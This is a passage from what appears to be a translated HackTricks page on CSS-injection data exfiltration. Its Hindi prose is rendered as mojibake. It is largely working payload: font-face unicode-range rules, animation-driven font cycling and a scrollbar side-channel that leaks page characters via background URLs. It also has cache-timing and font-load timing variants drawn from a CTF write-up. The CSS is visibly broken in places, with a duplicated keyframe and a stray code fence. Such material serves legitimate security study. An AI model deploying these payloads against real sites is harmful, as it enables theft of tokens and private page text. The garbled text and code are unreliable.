@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### рдкрд╛рда рдиреЛрдб рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди (III): рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдлрд╝реЙрдиреНрдЯ рдХреЗ рд╕рд╛рде рдЪрд╛рд░рд╕реЗрдЯ рд▓реАрдХ рдХрд░рдирд╛ рдПрд▓рд┐рдореЗрдВрдЯреНрд╕ рдХреЛ рдЫреБрдкрд╛рдХрд░ (рдмрд╛рд╣реНрдп рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**рд╕рдВрджрд░реНрдн:** рдЗрд╕реЗ [рдЗрд╕ рд▓реЗрдЦрди рдореЗрдВ рдПрдХ рдЕрд╕рдлрд▓ рд╕рдорд╛рдзрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

рдпрд╣ рдорд╛рдорд▓рд╛ рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рд╕реЗ рдмрд╣реБрдд рд╕рдорд╛рди рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╡рд┐рд╢реЗрд╖ **рдЪрд╛рд░реНрд╕ рдХреЛ рдЕрдиреНрдп рд╕реЗ рдмрдбрд╝рд╛ рдмрдирд╛рдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдХреБрдЫ рдЫреБрдкрд╛рдирд╛** рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдмреЙрдЯ рджреНрд╡рд╛рд░рд╛ рджрдмрд╛рдпрд╛ рди рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдмрдЯрди рдпрд╛ рдПрдХ рдЫрд╡рд┐ рдЬреЛ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП рд╣рдо рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЛ рдорд╛рдк рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдХрдореА) рдФрд░ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдЯреЗрдХреНрд╕реНрдЯ рдореЗрдВ рдХреЛрдИ рд╡рд┐рд╢реЗрд╖ рдЪрд╛рд░ рд╣реИред

### рдкрд╛рда рдиреЛрдб рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди (III): рдХреИрд╢ рд╕рдордп рджреНрд╡рд╛рд░рд╛ рдЪрд╛рд░рд╕реЗрдЯ рд▓реАрдХ рдХрд░рдирд╛ (рдмрд╛рд╣реНрдп рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**рд╕рдВрджрд░реНрдн:** рдЗрд╕реЗ [рдЗрд╕ рд▓реЗрдЦрди рдореЗрдВ рдПрдХ рдЕрд╕рдлрд▓ рд╕рдорд╛рдзрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╣рдо рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдЯреЗрдХреНрд╕реНрдЯ рдореЗрдВ рдПрдХ рдЪрд╛рд░ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдПрдХ рдЭреВрдард╛ рдлрд╝реЙрдиреНрдЯ рд▓реЛрдб рдХрд░рдХреЗ рд╕рдорд╛рдзрд╛рди рд╕реЗ:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
рдпрджрд┐ рдПрдХ рдорд┐рд▓рд╛рди рд╣реЛрддрд╛ рд╣реИ, рддреЛ **рдлреЙрдиреНрдЯ `/static/bootstrap.min.css?q=1` рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреИрд╢ рдХрд░реЗрдЧрд╛**, рдФрд░ рдпрджрд┐ рдХреЛрдИ рдХреИрд╢ рдирд╣реАрдВ рд╣реИ, рддреЛ рдПрдХ **304 not modified** рддрдВрддреНрд░ рд╣реИ, рддреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЕрдиреНрдп рдЪреАрдЬреЛрдВ рд╕реЗ рддреЗрдЬ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдХреИрд╢ рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЧреИрд░-рдХреИрд╢ рд╡рд╛рд▓реЗ рд╕реЗ рдЕрдВрддрд░ рдХрд╛рдлреА рдмрдбрд╝рд╛ рдирд╣реАрдВ рд╣реИ, рддреЛ рдпрд╣ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд▓реЗрдЦрдХ рдиреЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛: рд╣рд╛рд▓рд╛рдВрдХрд┐, рдкрд░реАрдХреНрд╖рдг рдХреЗ рдмрд╛рдж, рдореБрдЭреЗ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ рдкрд╣рд▓реА рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЧрддрд┐ рдореЗрдВ рдЬреНрдпрд╛рджрд╛ рдЕрдВрддрд░ рдирд╣реАрдВ рд╣реИ, рдФрд░ рджреВрд╕рд░реА рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдмреЙрдЯ `disk-cache-size=1` рдзреНрд╡рдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╡рд┐рдЪрд╛рд░рд╢реАрд▓ рд╣реИред

### рдкрд╛рда рдиреЛрдб рдЙрджреНрдзрд░рдг (III): рд╕рдордп рд▓реЛрдбрд┐рдВрдЧ рд╕реЗ рдЪрд╛рд░рд╕реЗрдЯ рд▓реАрдХ рдХрд░рдирд╛ рд╕реИрдХрдбрд╝реЛрдВ рд╕реНрдерд╛рдиреАрдп "рдлреЙрдиреНрдЯ" (рдмрд╛рд╣реНрдп рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**рд╕рдВрджрд░реНрдн:** рдЗрд╕реЗ [рдЗрд╕ рд▓реЗрдЦрди рдореЗрдВ рдПрдХ рдЕрд╕рдлрд▓ рд╕рдорд╛рдзрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЬрдм рдПрдХ рдорд┐рд▓рд╛рди рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЖрдк **CSS рдХреЛ рд╕реИрдХрдбрд╝реЛрдВ рдирдХрд▓реА рдлреЙрдиреНрдЯреНрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреЗрдд рджреЗ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрдм рдПрдХ рдорд┐рд▓рд╛рди рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣ рдЖрдк **рд╕рдордп рдХреЛ рдорд╛рдк рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдпрд╣ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╡рд╕реНрддреБ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ рдпрд╛ рдирд╣реАрдВ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
рдФрд░ рдмреЙрдЯ рдХрд╛ рдХреЛрдб рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдлрд╝реЙрдиреНрдЯ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдмреЙрдЯ рдХреЛ рджреЗрдЦрдиреЗ рдкрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕рдордп рдХрд╛ рдЕрдиреБрдорд╛рдирд┐рдд рд╕рдордп рд▓рдЧрднрдЧ 30 рд╕реЗрдХрдВрдб рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдлрд╝реЙрдиреНрдЯ рдореЗрд▓ рд╣реИ, рддреЛ рдлрд╝реЙрдиреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗ, рдЬрд┐рд╕рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рд▓рдЧрд╛рддрд╛рд░ рдЧрддрд┐рд╡рд┐рдзрд┐ рд╣реЛрдЧреАред рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╕реНрдерд┐рд░рддрд╛ рд╢рд░реНрдд рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╕рдордп рд▓рдЧреЗрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕рдордп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдлрд╝реЙрдиреНрдЯ рдореЗрд▓ рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
